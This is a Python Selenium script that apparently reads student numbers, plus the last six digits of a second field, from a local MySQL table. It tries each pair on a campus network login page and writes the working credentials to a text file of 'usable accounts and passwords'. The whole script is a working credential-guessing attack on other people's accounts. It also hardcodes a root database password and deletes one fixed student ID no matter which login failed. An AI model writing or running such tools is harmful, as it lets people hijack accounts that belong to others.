from selenium import webdriver
import pymysql
import os




class XiaoYuanWang:
    user_list = []
    passwd_list = []

    db = pymysql.Connect(host='localhost', port=3306, passwd='1122', db='xiaoyuanwang', user='root', charset='utf8')
    cursor = db.cursor()

    def execute_sql_select(self, sql):
        self.cursor.execute(sql)
        for data in self.cursor.fetchall():
            self.user_list.append(data[0])
            self.passwd_list.append(data[1][-6: ])


    def save(self, username, passwd):
        with open('校园网可用账号密码.txt', 'a+', encoding='utf-8') as fp:
            fp.write('账号：{} \t 密码：{}  \n'.format(username, passwd))

    def get_url(self):
        for i in range(len(self.user_list)):
            driver = webdriver.Chrome(executable_path=r"/home/zhangyi/chromedriver")
            driver.maximize_window()
            driver.get('http://192.168.255.100/0.htm')

            username = driver.find_element_by_id('username')
            password = driver.find_element_by_id('password')
            button = driver.find_element_by_id('submit')

            username.click()
            username.clear()
            username.send_keys(self.user_list[i])

            password.click()
            password.clear()
            password.send_keys(self.passwd_list[i])

            button.click()
            try:
                error_text = driver.find_element_by_xpath('//*[@id="info"]').text

                if error_text == ' 账号或密码不对，请重新输入 ':
                    print('登录失败，user:《{}》passwd:《{}》 账号密码错误'.format(self.user_list[i], self.passwd_list[i]))
                    sql = "DELETE FROM `Sheet1` WHERE `学号` = '2019012251';"
                    self.cursor.execute(sql)
                    print("已从数据库删除")

                elif error_text == '本账号费用超支或时长流量超过限制':
                    print('登录失败，改账户 user:《{}》passwd:《{}》 流量超支'.format(self.user_list[i], self.passwd_list[i]))

            except:
                print('登录成功，user:《{}》passwd:《{}》'.format(self.user_list[i], self.passwd_list[i]))
                self.save(self.user_list[i], self.passwd_list[i])
                # break


if __name__ == '__main__':
    x = XiaoYuanWang()

    file = '校园网可用账号密码.txt'
    if os.path.isfile(file):
        os.unlink(file)
        print('{} 已存在, 删除成功 {}'.format(file, file))

    sql = "SELECT DISTINCT * FROM `Sheet1`"
    x.execute_sql_select(sql)

    x.get_url()